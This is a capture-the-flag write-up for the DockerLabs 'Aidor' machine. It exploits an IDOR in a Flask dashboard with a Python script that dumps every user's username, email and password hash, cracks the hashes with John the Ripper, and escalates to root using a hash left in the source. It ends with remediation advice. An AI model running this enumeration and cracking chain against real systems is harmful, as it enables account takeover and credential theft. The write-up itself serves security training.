# Aidor — DockerLabs Writeup

**Platform:** DockerLabs · **Difficulty:** Easy · **Target IP:** 172.17.0.2 ·

## Summary

Aidor is an easy-level machine based on an IDOR (Insecure Direct Object Reference) vulnerability in a web dashboard built with Flask. A simple self-registration process grants access to a dashboard that uses a user-supplied `id` parameter without verifying ownership, thereby exposing the personal information of all users directly within the page's HTML code. Cracking the associated hashes provides SSH access, while residual credentials found in the application's source code lead directly to root access.

**Attack chain:** Recon → Enumeration of `/register` and `/dashboard` (Flask app on port 5000) → Register account → IDOR on `/dashboard?id=N` leaks all usernames + password hashes → Crack hashes with John → SSH login as `aidor` → Read `app.py` source, exposing a commented-out root credential → Crack root hash → `su root` → root

## 1. Reconnaissance

```bash
ping -c 4 172.17.0.2
```
<img width="696" height="263" alt="image" src="https://github.com/user-attachments/assets/f9bef920-0ef4-4bcc-94a1-d2ec9fe2f213" />


```bash
nmap -p- -sS -sC -sV -vvv 172.17.0.2
```

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 10.0p2 Debian 7 (protocol 2.0)
5000/tcp open  http    syn-ack ttl 64 Werkzeug httpd 3.1.3 (Python 3.13.5)
|_http-server-header: Werkzeug/3.1.3 Python/3.13.5
|_http-title: Iniciar Sesi\xC3\xB3n
| http-methods: 
|_  Supported Methods: POST HEAD GET OPTIONS
```

Two services exposed: SSH and a Flask web application on port 5000, with a login page titled "Iniciar Sesión".

<img width="778" height="894" alt="image" src="https://github.com/user-attachments/assets/dcdf093b-bfc6-4ffd-b2a8-4b91e28f9bfc" />


## 2. Web Enumeration

Directory brute-force against the Flask app:

```bash
dirb http://172.17.0.2:5000
```

<img width="523" height="499" alt="image" src="https://github.com/user-attachments/assets/b03fde9f-7d94-481c-8009-1c7418f8ef75" />


**Interesting paths found:**

| Path | Code |
|------|------|
| `/change_password` | 405 (POST only — not browsable) |
| `/console` | 400 |
| `/dashboard` | 302 |
| `/logout` | 302 |
| `/register` | 200 |

`/register` returns 200 without authentication — self-service account creation is open.

## 3. Initial Access via Self-Registration

![Empty registration form](images/05-register-empty.png)

Registered a throwaway account through `/register`:

```
username: Osdan
email: osdan@gmail.com
password: osdantest123@
```
<img width="477" height="433" alt="image" src="https://github.com/user-attachments/assets/2401f2ce-fc02-4594-b8db-627f58962e4d" />



Registration succeeded and redirected to `/dashboard?id=55` — the newly created account's ID appears directly in the URL as a plain integer.


<img width="926" height="980" alt="image" src="https://github.com/user-attachments/assets/36452146-8923-47bf-9f53-025d1980f5c8" />


## 4. IDOR — Discovering the Hash Leak

The `id` parameter in `/dashboard?id=N` (`N` being any numeric user ID) is trusted without verifying it belongs to the logged-in session. Scrolling down the same dashboard page also reveals a "Cambiar Contraseña" section that displays the **current password hash** of whichever `id` is loaded — the hash is rendered straight into the HTML:

```html
<div class="password-section">
    <h3><i class="fas fa-key"></i> Cambiar Contraseña</h3>
    <div class="password-info">
        <div class="current-password-display">
            <p><strong>Contraseña Actual (Hash):</strong></p>
            <div class="password-hash">5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8</div>
        </div>
    </div>
    <form method="POST" action="/change_password" class="password-form">
        ...
    </form>
</div>
```

Note: `/change_password` itself only accepts `POST` (confirmed by the 405 in the dirb scan and a manual GET test) — the hash isn't served from that route. It's embedded directly in the `/dashboard?id=N` page, so no extra request is needed to read it.

## 5. Automating the Dump with Python

A script walks through IDs 1-100, pulling the username and hash out of each `/dashboard?id=N` response, and saves the results:
```python
import requests
from bs4 import BeautifulSoup
import time

# Configuration de la solicitud
url_base = "http://172.17.0.2:5000/dashboard"
output_file = "Usuarios_ID_extraidos.txt"
users_file = "usuarios.txt"
hashes_file = "hashes.txt"
hydra_hash_file = "hydra_hashes.txt"
counter = 0

# Carreras extras de tu petition
headerss = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "es-MX,es;q=0.5",
    "Connection": "keep-alive",
    "Cookie": "session=eyJ1c2VyX2lkIjo5fQ.ah2Sfw.blClLFDRAxtkbNp4JSlKwK-_UTk",
    "Upgrade-Insecure-Requests": "1"
}
headers = {}


print(f"[*] Iniciando extracción de IDs (1 al 99)...")
print("-" * 60)

with (open(output_file, "w", encoding="utf-8") as idf,
      open(users_file, "w", encoding="utf-8") as uf,
      open(hashes_file, "w", encoding="utf-8") as hf,
      open(hydra_hash_file, "w", encoding="utf-8") as hhf
      ):
    for i in range(1, 100):
        params = {'id': i}
        
        try:
            response = requests.get(url_base, headers=headers, params=params, timeout=5)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # CORRECTION AQUÍ: Se usa class_ con guión bajo al final
                info_values = soup.find_all("span", class_="info-value")
                password_hash_div = soup.find("div", class_="password-hash")
                
                if len(info_values) >= 3 and password_hash_div:
                    username = info_values[0].text.strip()
                    email = info_values[1].text.strip()
                    user_id = info_values[2].text.strip()
                    pwd_hash = password_hash_div.text.strip()
                    
                    result_id = (
                        f"ID Solicitado: {i}\n"
                        f"Usuario:       {username}\n"
                        f"Email:         {email}\n"
                        f"ID Interno:    {user_id}\n"
                        f"Hash:          {pwd_hash}\n"
                        f"{'-'* 40}\n"
                    )

                    result_users = f"{username}\n"
                    
                    result_hashes = f"{pwd_hash}\n"

                    result_hydra_hash = f"{username}:{pwd_hash}\n"
                    
                    print(f"[+] ID {i} encontrado:")
                    print(f"    Usuario: {username} | Email: {email} | Hash: {pwd_hash}...")
                    
                    idf.write(result_id)
                    idf.flush()
                    uf.write(result_users)
                    uf.flush()
                    hf.write(result_hashes)
                    hf.flush()
                    hhf.write(result_hydra_hash)
                    hhf.flush()
                    counter = counter + 1
                else:
                    print(f"[-] ID {i}: Estructura de perfil no encontrada o ID vacío.")
            else:
                print(f"[-] ID {i}: Código de estado HTTP {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Error de conexión en ID {i}: {e}")
        time.sleep(0.1)

print("-" * 60)
print(f"[+] Proceso finalizado.")
print(f"Total ID found: {counter}")
print(f"Resultados guardados en: {output_file}")
print(f"Usuarios guardados en: {users_file}")
print(f"Hash guardados en: {hashes_file}")
print(f"Hydra Hash guardados en: {hydra_hash_file}")
```

Output Console Example (trimmed — most accounts share one generic placeholder hash):

```
[+] ID 52 encontrado:
    Usuario: pingu | Email: pingu@pingu.es | Hash: dd0284ae23bfe3ed87de34568afa73e03380b7990fcb69b2d11cc902eb1060a3...
[+] ID 53 encontrado:
    Usuario: pepe | Email: pepe@pepe.es | Hash: 7c9e7c1494b2684ab7c19d6aff737e460fa9e98d5a234da1310c97ddf5691834...
[+] ID 54 encontrado:
    Usuario: aidor | Email: aidor@aidor.es | Hash: 7499aced43869b27f505701e4edc737f0cc346add1240d4ba86fbfa251e0fc35...
[+] ID 55 encontrado:
    Usuario: Osdan | Email: osdan@gmail.com | Hash: d2dc7fed9985146f33980d784257c0cf6eaaf4c805f69244718f208e6511b511...
.....56 to 99.............
[-] ID 99: Estructura de perfil no encontrada o ID vacío.
------------------------------------------------------------
[+] Proceso finalizado.
Total ID found: 53
Resultados guardados en: Usuarios_ID_extraidos.txt
Usuarios guardados en: usuarios.txt
Hash guardados en: hashes.txt
Hydra Hash guardados en: hydra_hashes.txt
```
<img width="727" height="407" alt="image" src="https://github.com/user-attachments/assets/7212d655-42aa-4bbc-969b-90fd46fea90f" />


Out of 53 accounts found, five stand out with **unique** hashes — the real, meaningful accounts on the box:

| User | Hash | Format |
|------|------|--------|
| `admin` | `d033e22ae348aeb5660fc2140aec35850c4da997` | SHA-1 (40 chars) |
| `pingu` | `dd0284ae23bfe3ed87de34568afa73e03380b7990fcb69b2d11cc902eb1060a3` | SHA-256 (64 chars) |
| `pepe` | `7c9e7c1494b2684ab7c19d6aff737e460fa9e98d5a234da1310c97ddf5691834` | SHA-256 (64 chars) |
| `aidor` | `7499aced43869b27f505701e4edc737f0cc346add1240d4ba86fbfa251e0fc35` | SHA-256 (64 chars) |
| `Osdan` | `d2dc7fed9985146f33980d784257c0cf6eaaf4c805f69244718f208e6511b511` | SHA-256 (64 chars) |

## 6. Cracking the Hashes

We can use commands to edit (`nano`) or view (`cat`) the files generated by the Python code in step 5:
```bash
❯ nano hydra_hashes.txt
❯ cat hydra_hashes.txt

Console Result:...
    admin:d033e22ae348aeb5660fc2140aec35850c4da997
    pingu:dd0284ae23bfe3ed87de34568afa73e03380b7990fcb69b2d11cc902eb1060a3
    pepe:7c9e7c1494b2684ab7c19d6aff737e460fa9e98d5a234da1310c97ddf5691834
    aidor:7499aced43869b27f505701e4edc737f0cc346add1240d4ba86fbfa251e0fc35
    Osdan:d2dc7fed9985146f33980d784257c0cf6eaaf4c805f69244718f208e6511b511
```

First pass with John auto-detecting the format:

rockyou.txt wordlist
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

```
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Warning: only loading hashes of type "Raw-SHA1", but also saw type "cryptoSafe"
Warning: only loading hashes of type "Raw-SHA1", but also saw type "gost"
Warning: only loading hashes of type "Raw-SHA1", but also saw type "HAVAL-256-3"
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
admin            (admin)
1g 0:00:00:00 DONE (2026-08-13 18:54) 50.00g/s 991200p/s 991200c/s 991200C/s aleinad..Portugal
Session completed.
```
custom wordlist
```bash
john --wordlist=passwords.txt hashes.txt
```
<img width="837" height="236" alt="image" src="https://github.com/user-attachments/assets/165985d3-586a-4ddd-8e4b-84d86e056300" />


Because the file mixes SHA-1 (`admin`, 40 chars) and SHA-256 (`pingu`, `pepe`, `aidor`, 64 chars), John only auto-loads the SHA-1 hash in this pass and cracks it immediately: **`admin` → `admin`**. The three SHA-256 hashes needed a forced format, run separately:

Show Raw-SHA1 passwords cracked
```bash
john --show --format=Raw-SHA1 hashes.txt
```
<img width="394" height="93" alt="image" src="https://github.com/user-attachments/assets/d24677f0-3f6d-4529-ac9c-5734a17d6aa3" />


Show Raw-SHA256 passwords cracked
```bash
john --show --format=Raw-SHA256 hashes.txt
```
<img width="396" height="87" alt="image" src="https://github.com/user-attachments/assets/91fe0bd3-c115-465f-87fd-ff86e9b739c5" />

.

..

...

<img width="396" height="101" alt="image" src="https://github.com/user-attachments/assets/e7941509-b8cd-45fc-840d-f43d799666e5" />






**Cracked credentials:**

| User | Password |
|------|----------|
| `admin` | `admin` |
| `pingu` | `pingu` |
| `pepe` | `pepe` |
| `aidor` | `chocolate` |
| `Osdan` | `osdantest123@` |

## 7. Testing the Credentials

`admin:admin` failed on the web login:

<img width="598" height="117" alt="image" src="https://github.com/user-attachments/assets/822b863f-03ea-4464-9a44-739199e0c38a" />


It also failed over SSH, as did `pingu:pingu` and `pepe:pepe`:

```bash
sudo ssh admin@172.17.0.2
# Permission denied, please try again.

sudo ssh pingu@172.17.0.2
# Permission denied, please try again.

sudo ssh pepe@172.17.0.2
# Permission denied, please try again.
```
<img width="354" height="108" alt="image" src="https://github.com/user-attachments/assets/a7a7b9f7-66cf-4ff8-8fc3-eac4c96aeb47" />

`aidor:chocolate` was the only one that worked over SSH:

```bash
ssh aidor@172.17.0.2
# password: chocolate
```
<img width="873" height="218" alt="image" src="https://github.com/user-attachments/assets/7c2cb07a-8511-4e75-82cf-c6337ed0a502" />


## 8. Post-Exploitation — Enumeration

```bash
whoami
id
sudo -l
ls -la
```
<img width="529" height="222" alt="image" src="https://github.com/user-attachments/assets/33b260e5-fc6c-406d-a5ef-ec53152bd8b4" />


`sudo` isn't even installed on the box (`-bash: sudo: command not found`), and the SUID binary list is standard — nothing exploitable there. Moved on to the home directory:

```bash
cd ..
ls -la
```
<img width="486" height="177" alt="image" src="https://github.com/user-attachments/assets/1d278486-fc51-4875-a724-4015b8616f1d" />


`app.py` and `database.db` sit directly in `/home`, owned by `root` but world-readable — outside `aidor`'s own home folder, but still accessible.

## 9. Source Code Disclosure

```bash
cat app.py
```

Reading the Flask source revealed two important details. First, a weak, hardcoded session secret:

```python
app.secret_key = 'my_secret_key'
```
<img width="739" height="262" alt="image" src="https://github.com/user-attachments/assets/af063cff-52d2-42bb-9a38-1602ef08cd53" />


Second, a **commented-out** seed statement that would have inserted a `root` user directly into the database:

```python
# cursor.execute('''
# INSERT INTO users (username, password, email) VALUES
# ('root', 'aa87ddc5b4c24406d26ddad771ef44b0', 'admin@example.com')
# ''')  # La contraseña "admin" es hash SHA-256
```
<img width="707" height="246" alt="image" src="https://github.com/user-attachments/assets/c49ccf97-42a6-40f0-b3f4-fda702dcf1ec" />

The comment mislabels the hash as SHA-256, but `aa87ddc5b4c24406d26ddad771ef44b0` is 32 hex characters — an **MD5** hash left behind by the machine's author as a hint toward the real root credential. The source also confirms the IDOR itself:

```python
@app.route('/dashboard')
def dashboard():
    user_id = request.args.get('id') or session.get('user_id')
    ...
    cursor.execute('SELECT * FROM users WHERE id=?', (user_id,))
```

`/dashboard` reads `id` straight from the query string and queries the database with it, with no check that it matches `session['user_id']` — exactly the flaw exploited in steps 4-5.

## 10. Cracking the Root Hash

```bash
echo "aa87ddc5b4c24406d26ddad771ef44b0" > root_hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt root_hash.txt
```

<img width="772" height="175" alt="image" src="https://github.com/user-attachments/assets/be0341ad-8f1e-439b-8152-7856270df34e" />


**Cracked value:** `estrella`

## 11. Privilege Escalation

```bash
su root
# password: estrella
```
<img width="306" height="69" alt="image" src="https://github.com/user-attachments/assets/31f73958-786d-4907-a2cd-4ed0689e13ae" />


```bash
root@3bc18b1c538f:~# whoami
root
root@3bc18b1c538f:~# id
uid=0(root) gid=0(root) groups=0(root)
```
<img width="345" height="126" alt="image" src="https://github.com/user-attachments/assets/7e480b17-457e-4d48-81f8-82e957014059" />

Root achieved.

## Root Cause & Remediation

| Issue | Fix |
|-------|-----|
| IDOR on `/dashboard?id=N` — no ownership check, exposes usernames and password hashes for any user ID | Always verify the requested resource belongs to the authenticated session; never trust a client-supplied ID for authorization |
| Password hashes rendered in plaintext HTML on the dashboard's password-change section | Never expose stored hashes to the client, even the user's own; hashes should stay server-side only |
| Weak, hardcoded Flask `secret_key` | Generate a strong random secret per deployment and load it from environment/secrets management, never hardcode in source |
| `database.db` and `app.py` world-readable in `/home` | Restrict file permissions on application source and database files; never leave them readable by non-owning users |
| Weak, wordlist-guessable passwords across multiple accounts (`admin`, `pingu`, `pepe`, `aidor`, `root`) | Enforce strong, unique passwords; disable or rotate default/test accounts before deployment |
| Leftover credential comment in source code (`root` seed with hash) | Remove debug/seed data and credentials from source before shipping; use `.gitignore` and secret scanning |
